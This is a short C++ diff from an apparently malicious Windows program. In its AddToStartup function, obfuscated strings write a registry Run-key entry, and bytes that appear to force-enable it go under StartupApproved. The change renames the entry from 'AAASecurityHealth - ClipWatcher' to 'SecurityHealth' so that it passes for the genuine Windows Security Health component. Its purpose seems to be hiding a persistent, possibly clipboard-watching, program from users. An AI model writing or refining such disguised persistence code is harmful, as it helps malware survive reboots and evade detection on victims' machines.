@@ -29,7 +29,7 @@ std::string WStringToUtf8(const std::wstring& wstr)
 void AddToStartup() {
     HKEY hKey;
     const char* runKey = OBFSTR("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
-    const char* valueName = OBFSTR("AAASecurityHealth - ClipWatcher");
+    const char* valueName = OBFSTR("SecurityHealth");
 
     const char* approvedKey = OBFSTR("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run");
     BYTE enabled[] = { 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
